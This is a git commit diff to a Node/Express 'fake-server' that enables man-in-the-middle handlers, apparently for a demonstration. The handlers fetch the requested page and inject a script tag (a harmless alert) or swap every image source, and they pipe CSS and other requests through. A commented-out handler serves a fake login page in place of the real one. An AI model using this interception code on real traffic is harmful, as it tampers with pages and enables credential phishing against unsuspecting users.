3d902beec6d0416393c52cc551639662a2c2c7db
LucasLudueno <ludueno.lucas@gmail.com>
2019-07-12 00:31:42 -0300

    Adding missing pipe requests

--- src/fake-server/index.js
+++ src/fake-server/index.js
@@ -14,52 +14,52 @@ app.get('/ping', (req, res) => {
 
 
 /**** Code Injection ****/
-// app.get('/', async (req, response) => {
-//   const SCRIPT_TO_ADD = 'alert("code added!");';
+app.get('/', async (req, res) => {
+  const SCRIPT_TO_ADD = 'alert("code added!");';
 
-//   const url = req.protocol + '://' + req.get('host') + req.originalUrl;
-//   console.log("Client request received", url)
+  const url = req.protocol + '://' + req.get('host') + req.originalUrl;
+  console.log("Client request received", url)
 
-//   const fetchedResponse = await fetch(url);
-//   const html = await fetchedResponse.text();
+  const fetchedResponse = await fetch(url);
+  const html = await fetchedResponse.text();
 
-//   console.log("Injecting script");
-//   const loadedHtml = cheerio.load(html);
-//   const scriptNode = `<script>${SCRIPT_TO_ADD}</script>`;
-//   loadedHtml('body').append(scriptNode);
+  console.log("Injecting script");
+  const loadedHtml = cheerio.load(html);
+  const scriptNode = `<script>${SCRIPT_TO_ADD}</script>`;
+  loadedHtml('body').append(scriptNode);
 
-//   response.send(loadedHtml.html());
-// });
+  res.send(loadedHtml.html());
+});
 
 
 
 /**** Image Injection  ****/
-// app.get('/', async (req, response) => {
-//   // const IMAGE_TO_REPLACE = 'https://media.lmneuquen.com/adjuntos/195/imagenes/003/563/0003563137.jpg';
-//   const IMAGE_TO_REPLACE = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYUR6eER5dHC5V-uc9uat18eX-rXlmvAkvqQZ6IL7BjNChuXLg";
+app.get('/', async (req, res) => {
+  const IMAGE_TO_REPLACE = 'https://media.lmneuquen.com/adjuntos/195/imagenes/003/563/0003563137.jpg';
+  // const IMAGE_TO_REPLACE = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYUR6eER5dHC5V-uc9uat18eX-rXlmvAkvqQZ6IL7BjNChuXLg";
 
-//   const url = req.protocol + '://' + req.get('host') + req.originalUrl;
-//   console.log("Client request received", url)
+  const url = req.protocol + '://' + req.get('host') + req.originalUrl;
+  console.log("Client request received", url)
 
-//   const fetchedResponse = await fetch(url);
-//   const html = await fetchedResponse.text();
+  const fetchedResponse = await fetch(url);
+  const html = await fetchedResponse.text();
 
-//   console.log("Replacing image");
-//   const regex = new RegExp('<img (.+?)src="[^"]+"', 'gi');
-//   const replaced = html.replace(regex, `<img src="${IMAGE_TO_REPLACE}"`);
+  console.log("Replacing image");
+  const regex = new RegExp('<img (.+?)src="[^"]+"', 'gi');
+  const replaced = html.replace(regex, `<img src="${IMAGE_TO_REPLACE}"`);
 
-//   response.send(replaced);
-// });
+  res.send(replaced);
+});
 
 
 
 /**** HTML Login Injection ****/
-// app.get('/', async (req, response) => {
+// app.get('/', async (req, res) => {
 //   const url = req.protocol + '://' + req.get('host') + req.originalUrl;
 //   console.log("Client request received", url)
 
 //   console.log("Replacing whole html");
-//   response.sendFile(path.join(__dirname+'/login.html'));
+//   res.sendFile(path.join(__dirname+'/login.html'));
 // });
 
 
@@ -83,6 +83,21 @@ app.get('/login.html', async (req, res) => {
   console.log("Real Url", realUrl)
 
   request({ url: realUrl }).pipe(res);
+});
+
+
+/*** Pipe css requests ***/
+app.get(/.*.css/, async (req, res) => {
+  const url = req.protocol + '://' + req.get('host') + req.originalUrl;
+
+  request({ url }).pipe(res);
+});
+
+/*** Pipe the rest of the requests ***/
+app.get(/.*/, async (req, res) => {
+  const url = req.protocol + '://' + req.get('host') + req.originalUrl;
+
+  request({ url }).pipe(res);
 });
 
 
